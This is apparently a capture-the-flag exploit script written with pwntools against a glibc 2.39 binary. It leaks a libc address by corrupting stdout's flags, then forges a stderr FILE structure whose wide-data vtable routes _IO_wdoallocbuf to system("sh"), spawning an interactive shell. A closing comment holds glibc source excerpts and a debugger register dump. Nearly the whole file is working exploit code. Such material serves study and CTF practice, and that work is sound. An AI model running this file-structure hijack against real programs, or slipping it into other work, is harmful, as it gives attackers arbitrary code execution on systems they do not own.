#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
context.terminal = ["tmux", "splitw", "-h"]
# context.encoding = 'utf-8'

gdbscript = '''
b *main+140
# tbreak main
dir ./glibc-2.39/
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie
logleak = lambda **k: [success(f"{k}: {v:#x}") for k, v in k.items()]


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper


_IO_IS_APPENDING     = 0x1000

sla(b'stdout:\n', flat(
    p32(0xfbad2887 | _IO_IS_APPENDING), # _flags
    cyclic(4), # padding
    cyclic(8), # read pts
    cyclic(8), # read pts
    cyclic(8), # read pts
    # 1b overwrite by scanf, enough
))

libc_leak = u64(r(8))
logleak(libc=libc_leak)

libc = ELF('./libc.so.6')
libc.address = libc_leak - 0x204644
logleak(libcaddress=libc.address)

# b _IO_flush_all
# pause()



class File:
	def __init__(self) -> None:
		self.buf = bytearray(224)

	def write(self, offset, value):
		for i, b in enumerate(value):
			self.buf[offset+i] = b


stderr = libc.sym['_IO_2_1_stderr_']
# 0x001791c7: add rdi, 0x10; jmp rcx;

fp = File()
# fp.write(0, p32(0xFBAD0000)) # _flags
fp.write(0, b'\x01\x01\x01\x01') # _flags
fp.write(4, b';sh') # _flags
fp.write(8, p64(0)) # _IO_read_ptr;
fp.write(16, p64(0)) # _IO_read_end;
fp.write(24, p64(0)) # _IO_read_base;
fp.write(32, p64(0)) # _IO_write_base;
fp.write(40, p64(1)) # _IO_write_ptr;
fp.write(48, p64(0)) # _IO_write_end;
fp.write(56, p64(0)) # _IO_buf_base;
fp.write(64, p64(0)) # _IO_buf_end;
fp.write(72, p64(0)) # _IO_save_base;
fp.write(80, p64(0)) # _IO_backup_base;
fp.write(88, p64(0)) # _IO_save_end;
fp.write(96, p64(0)) # _markers
fp.write(104, p64(0)) # _chain
fp.write(112, p32(2)) # _fileno
fp.write(116, p32(0)) # _flags2
fp.write(120, p64(0xffffffffffffffff)) # _old_offset
fp.write(128, p16(0)) # _cur_column
fp.write(130, p8(0)) # _vtable_offset
fp.write(131, b'\x00' * 5)  # _shortbuf
fp.write(136, p64(libc.sym['_IO_stdfile_2_lock'])) # _lock
fp.write(144, p64(0xffffffffffffffff)) # _offset
fp.write(152, p64(0)) # _codecvt
fp.write(160, p64(stderr-0x10)) # _wide_data (wide vtable points to unused field in stdout)
fp.write(168, p64(0)) # _freeres_list
fp.write(176, p64(0)) # _freeres_buf
fp.write(184, p64(0)) # __pad5
fp.write(192, p32(0xffffffff)) # _mode
fp.write(196, p32(0) + p64(libc.sym.system) + p64(stderr+96)) # _unused2, 4B padding, wide_vtable pointer and vtable entry for doallocate
fp.write(216, p64(libc.sym['_IO_wfile_jumps'])) # vtable

if b' ' in fp.buf:
    error("Space in payload!")
    exit(1)

sla(b'stderr:', flat(
    fp.buf,
))


"""
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0
      || f->_wide_data->_IO_write_base == NULL)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
	{
	  _IO_wdoallocbuf (f);

       

void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
		     fp->_wide_data->_shortbuf + 1, 0);
}
libc_hidden_def (_IO_wdoallocbuf)



my call context:


 RAX  0x7e1dbca04540 (_IO_2_1_stderr_+96) ◂— 0
 RBX  0x7e1dbca044e0 (_IO_2_1_stderr_) ◂— 0xfbad0000
 RCX  1
 RDX  0xfbad0000
 RDI  0x7e1dbca044e0 (_IO_2_1_stderr_) ◂— 0xfbad0000
 RSI  0
 R8   0x7ffc1b2774e0 ◂— 0x100000007
 R9   0
 R10  0x7ffc1b27746f ◂— 0x7ffc1b27748000
 R11  0x7ffc1b277470 —▸ 0x7ffc1b277480 —▸ 0x7ffc1b2774b0 —▸ 0x7ffc1b277530 —▸ 0x7ffc1b277590 ◂— ...
 R12  0xffffffff
 R13  0x7e1dbca01ee0 (__io_vtables) ◂— 0
 R14  0x7ffc1b277450 —▸ 0x7e1dbc8944d0 (flush_cleanup) ◂— endbr64
 R15  0x7e1dbca056f0 (list_all_lock) ◂— 1
 RBP  0x7ffc1b277410 —▸ 0x7ffc1b277430 —▸ 0x7ffc1b2774b0 —▸ 0x7ffc1b277530 —▸ 0x7ffc1b277590 ◂— ...
*RSP  0x7ffc1b2773e8 —▸ 0x7e1dbc88aea7 (_IO_wdoallocbuf+55) ◂— cmp eax, -1
*RIP  0x7e1dbc9111c1 (exec_comm+673) ◂— xor ecx, ecx

"""

ia()
